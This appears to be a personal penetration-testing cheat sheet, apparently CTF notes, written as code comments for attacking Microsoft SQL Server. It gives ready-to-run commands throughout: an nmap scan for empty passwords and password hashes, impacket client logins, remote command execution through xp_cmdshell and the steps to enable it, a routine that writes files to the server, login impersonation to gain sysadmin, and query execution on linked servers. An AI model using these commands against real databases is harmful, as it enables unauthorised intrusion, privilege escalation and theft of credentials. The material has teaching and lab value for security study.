// MSSQL ( Microsoft SQL Server )
//! Nmap script
// sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {ip}
//! Connecting to the MSSQL server
//* Local user
// at /ctf
// python3 impacket/examples/mssqlclient.py {username}:{password}@{ip} -port 1433 -windows-auth
//* Domain user
// python3 impacket/examples/mssqlclient.py .\\{username}:{password}@{ip} -port 1433 -windows-auth
//! xp_cmdshell
//* RCE
// if enabled : xp_cmdshell 'whoami'
//* Enabling xp_cmdshell
// if we have priveleges
// RECONFIGURE
// EXECUTE sp_configure 'xp_cmdshell', 1
// RECONFIGURE
//! Writing a file to the server
// DECLARE @OLE INT
// DECLARE @FileID INT
// EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
// EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '{file-path}/{file-name}', 8, 1
// EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '{file-content}'
// EXECUTE sp_OADestroy @FileID
// EXECUTE sp_OADestroy @OLE
//! Impersonate Existing Users with MSSQL
//* see who we can impersonate
// SELECT distinct b.name
// FROM sys.server_permissions a
// INNER JOIN sys.server_principals b
// ON a.grantor_principal_id = b.principal_id
// WHERE a.permission_name = 'IMPERSONATE'
//* impersonate a user of them and check their privileges
// EXECUTE AS LOGIN = '{username}'
// SELECT SYSTEM_USER
// SELECT IS_SRVROLEMEMBER('sysadmin')
//! Linked Servers
//* Identify linked servers
// SELECT srvname, isremote FROM sysservers
// 0 means its linked
//* Execute queries on linked servers
// EXECUTE('{query}') AT [{linked-server-name}]

